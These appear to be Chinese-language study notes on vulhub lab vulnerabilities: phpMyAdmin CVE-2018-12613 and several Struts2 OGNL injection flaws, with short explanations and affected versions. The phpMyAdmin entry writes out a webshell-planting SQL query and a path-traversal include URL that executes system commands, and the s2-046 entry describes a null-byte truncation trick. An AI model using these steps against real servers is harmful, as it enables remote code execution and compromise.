[PHPMYADMIN]CVE-2018-12613

漏洞分析见此处
index.php 的target存在任意文件包含 ，绕过过滤即可，版本是4.8.1
先执行sql语句 SELECT ‘<?=eval($_REQUEST[1])?>’;
然后 包含session index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_dfc4d1ce67fb8827bbdeabf3bfe8d172&1=system(‘env’);
如果找不到session的话也可以用上面文章的方法，把WebShell当做数据表的字段值写入到数据库文件中，然后包含数据库文件即可

[struts2]s2-013

https://github.com/vulhub/vulhub/tree/master/struts2/s2-013
includeParams=all，参数将由OGNL表达式解析，解析中导致命令执行
影响版本：2.0.0-2.3.14.1 payload

[struts2]s2-001

https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md
提交表单数据失败后用%{value} 对提交的数据执行了一次 OGNL 表达式解析，然后把数据返回到之后填的表单中
payload

[struts2]s2-045（CVE-2017-5638）

https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/README.zh-cn.md
分析见 https://blog.csdn.net/u011721501/article/details/60768657
大概就是struts2在处理错误的content-type时使用了ognl解析
影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 poc

[struts2]s2-046

https://github.com/vulhub/vulhub/blob/master/struts2/s2-046/README.zh-cn.md
和045一样，输入点在filename处，payload最后的引号前面加上00截断再任意+上一个字符即可 如\x00b

[struts2]s2-007

https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md
当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，
后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL 表达式解析
影响版本: 2.0.0 - 2.2.3
利用方式像sql注入，先闭合引号，poc

[struts2]s2-016

https://github.com/vulhub/vulhub/blob/master/struts2/s2-016/README.zh-cn.md
在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀
但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令
影响版本: 2.0.0 - 2.3.15 poc

[struts2]s2-008

https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md
devMode 模式下直接添加参数?debug=command&expression=OGNL，会直接执行后面的 OGNL 表达式，因此可以直接执行命令
影响版本: 2.1.0 - 2.3.1 POC
